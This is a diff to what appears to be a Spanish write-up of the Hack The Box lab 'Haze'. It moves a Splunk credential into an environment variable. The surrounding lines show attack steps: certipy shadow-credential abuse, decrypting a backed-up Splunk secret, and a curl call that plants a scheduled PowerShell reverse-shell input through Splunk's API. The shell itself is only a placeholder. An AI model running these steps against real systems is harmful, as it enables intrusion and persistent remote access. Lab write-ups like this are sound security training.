@@ -70,7 +70,8 @@ certipy-ad shadow auto -username 'HAZE-IT-BACKUP$@haze.htb' -hashes :<NTLM> -acc
 
 ```bash
 splunksecrets splunk-legacy-decrypt -S backup/etc/auth/splunk.secret '<BLOB>'
-curl -sk -u 'admin:<PASSWORD>' -X POST \
+# Exporta SPLUNK_AUTH con el usuario y la contraseña antes de ejecutar.
+curl -sk --user "$SPLUNK_AUTH" -X POST \
   'https://haze.htb:8089/servicesNS/nobody/search/data/inputs/powershell' \
   --data-urlencode 'name=evil' --data-urlencode 'script=<PS_REVSHELL>' \
   --data-urlencode 'schedule=0/30 * * * * ?' --data-urlencode 'index=main'
